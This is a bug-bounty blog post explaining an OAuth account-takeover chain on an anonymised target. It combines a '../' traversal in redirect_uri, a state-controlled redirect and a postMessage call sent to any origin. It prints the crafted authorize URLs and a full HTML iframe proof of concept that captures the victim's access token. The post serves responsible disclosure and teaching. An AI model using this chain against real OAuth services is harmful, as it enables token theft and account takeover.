---
layout: post
title: OAuth and PostMessage
subtitle: Chaining misconfigurations for your access token.
tags: [postmessage,OAuth,ATO]
---

Tl;dr: An OAuth misconfiguration was discovered in the `redirect_uri` parameter at the target's OAuth IDP at https://app.target.com/oauth/authorize, which allowed attackers to control the path of the callback endpoint using the `../` characters. This issue was chained with a postMessage misconfiguration at a different subdomain, `https://xyz.target.com/something/somepage.html`, which used the same IDP for authenticating users. This chain of vulnerabilities led to access token leakage and account takeover.

## Summary

It has been a while since I last wrote about a finding. In this blog post, I want to share a vulnerability where I was able to chain an OAuth misconfiguration (yes, they still exist!) with a postMessage misconfiguration. This ultimately allowed me to steal a victim's login tokens if they clicked on a malicious link. For the sake of confidentiality, I've made changes to the original vulnerable URLs.

I usually go deep into a single application while testing for bugs. This approach allows me to understand the functionalities of the target, which can lead to findings like this one. I'll assume that readers of this post are familiar with OAuth. If not, I strongly recommend going through [this](https://developer.okta.com/blog/2017/06/21/what-the-heck-is-oauth) article first.

## OAuth misconfiguration

OAuth misconfigurations typically occur when properties of an OAuth client are configured insecurely, which can lead to consequences such as access token leakage. Let’s assume the target I was testing had an OAuth IDP at `https://app.target.com/oauth/authorize`

Messing with the `redirect_uri` parameter is one of the most common ways to exploit OAuth weaknesses. An attacker can provide a malicious URL in the redirect_uri parameter, causing the user to be redirected to that URL with their access token or OAuth code.

However, this type of vulnerability has become quite rare these days. Simply providing my URL in the `redirect_uri` parameter didn't work here, and the server threw an error as expected. After some investigation, I discovered that it was possible to manipulate the path of the callback endpoint in the redirect_uri parameter using `../`. For example, if we click:

~~~
https://app.target.com/oauth/authorize?client_id=APP&redirect_uri=https://app.target.com/callback/../anything&response_type=token
~~~

we would be redirected to: 

~~~
https://app.target.com/anything#access_token=[ACCESS_TOKEN_FOR_APP]
~~~

Instead of the intended `/callback` endpoint! 

However, this discovery was useless unless we could find an open redirection issue and chain it up with this directory traversal to exfiltate the victim's access token. I spent some time looking for an open redirection but couldn't find any. After spending more time, I decided to change my approach.

## A different Approach

The target I was testing was a mid-sized enterprise software company with multiple subdomains and features, such as resources, learning centers, blogs, etc. I began exploring these areas without actively testing for any bugs, as they were out of scope.

One specific subdomain, xyz.target.com, featured a login process that utilized the authorization server at `https://app.target.com/oauth/authorize`, similar to the main application for user authentication. The OAuth request looked like this:

~~~
https://app.target.com/oauth/authorize?client_id=XYZ&redirect_uri=https://xyz.target.com/callback&response_type=code&state=%2F
~~~

If the user is logged in at `https://app.target.com`, the server would redirect them to:

~~~
https://xyz.target.com/callback?code=[oauth_code_for_xyz]&state=%2F
~~~

This then triggers a 302 redirect where the Location header value matches the state parameter, which is `%2F` (equivalent to /). This indicates that we can control the path after the OAuth flow.

The subdomain at xyz.target.com was a learning center where users could complete their course and give exams for certifications. While surfing, I noticed an HTML file requested in the background: **https://xyz.target.com/something/somepage.html** with the following content:

~~~HTML
<script>
//...snip...
      window.frameHash = window.location.hash.replace(/^#/, '');

      var postToParent = function(message) {
        if (window.parent.postMessage != null) {
          window.parent.postMessage(message, '*');
        }
      };

//...snip...

postToParent({
      id: window.frameHash,
      message: 'loaded'
    });

</script>
~~~

As soon as I saw this, I knew I have an account takeover vulnerability. If you didn't notice, the above code snippet is vulnerable to postMessage misconfiguration. PostMessage misconfiguration happens when the browser sends sensitive data to different origins using the **window.postmessage()** javascript function. You can read more about these misconfigurations [here](https://book.hacktricks.xyz/pentesting-web/postmessage-vulnerabilities). 

This specific code would send the  **window.location.hash** property to its parent window, at line 10, regardless of any origin (\*). Additionally, the page was also missing the **X-frame-Options** header that allowed any origin to load it in iframes. 

Now that we have a directory traversal, a limited redirection, and a postmessage misconfig, we can chain these issues to steal the victim's access token for https://app.target.com**! Before proceeding, I'd like you to first think about how we can take advantage of these three issues and leak the access token.**

Here's my PoC to exploit the issues, 

~~~HTML
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>POC</title>
</head>
<body>

<iframe src="https://app.target.com/oauth/authorize?client_id=APP&response_type=token&redirect_uri=https%3A%2F%2Fapp.target.com%2Fcallback%2F..%2Foauth%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3DXYZ%26redirect_uri%3Dhttps%253A%252F%252Fxyz.target.com%252Fcallback%26scope%3Dfull%26state%3D%2fsomething%2fsomepage.html&scope=full"></iframe>

<script type="text/javascript">
  window.addEventListener("message",function(e){alert(JSON.stringify(e.data))})
</script>

</body>
</html>
~~~

The above POC code would create an Iframe pointing to :
~~~
https://app.target.com/oauth/authorize?client_id=APP&response_type=token&redirect_uri=https://app.target.com/callback/../oauth/authorize?response_type=code%26client_id=XYZ%26redirect_uri=https%3A%2F%2Fxyz.target.com%2Fcallback%26scope=full%26state=%2fsomething%2fsomepage.html&scope=full&response_type=token
~~~
 
If the user is logged into app.target.com, the following happens:-

After visiting our malicious hosted page, the server would throw a 302 to the following URL, with the access token in the hash. The hash is always preserved on the client-side irrespective of the number of redirections.
~~~
https://app.target.com/callback/../oauth/authorize?response_type=code&client_id=XYZ&redirect_uri=https://xyz.target.com/callback&state=/something/somepage.html#access_token=[ACCESS_TOKEN_FOR_APP]`
~~~

Notice the path of the redirection: `/callback/../oauth/authorize/`. This directory traversal would initiate the OAuth flow for the xyz.target.com domain with the access token for the app in the hash with the following 302 redirections:
~~~
https://app.target.com/oauth/authorize?client_id=XYZ&redirect_uri=https://xyz.target.com/callback&response_type=code&state=/something/somepage.html#access_token=[ACCESS_TOKEN_FOR_APP]
~~~

With our token still  in the hash the user gets redirected to
~~~
https://xyz.target.com/callback?code=[oauth_code_for_xyz]&state=/something/somepage.html#access_token=[ACCESS_TOKEN_FOR_APP]
~~~

Notice the value of the state parameter. 

This callback endpoint would authenticate the user to xyz.target.com and then redirect them to the page vulnerable to postmessage misconfiguration.
~~~
https://xyz.target.com/something/somepage.html#access_token=[ACCESS_TOKEN_FOR_APP]
~~~

The **window.postmessage()** function would then send the access_token in its hash to the parent window (Our malicious page that hosted the iframe).

Since the entire **app.target.com** relied on this stolen access token for authentcating a user, an attacker could've takeover the victim's account by exploiting these issues.

This issue was reported and resolved by removing the HTML page with vulnerable postMessage misconfig as well as by blocking **../** characters in the **redirect_uri** parameter. 

## Timeline:

* 5-Aug-2021:  Issue discovered and reported

* 13-Aug-2021: Severity lowered from **high** to **medium** because the postmessage misconfiguration was on an OOS subdomain.

* 13-Aug-2021: Bounty Rewarded as along with a bonus because the team thought it was quite an impressive exploit chain :)

![feedback](/assets/img/oauth-postmessage-misconfig/feedback.JPG){: .mx-auto.d-block :}

* 8-Oct-2021:  Issue resolved and closed. 


Thanks for reading! Feel free to reach out on [Twitter](https://twitter.com/surajdisoja) if you have any doubts regarding the post or want to chat! :)
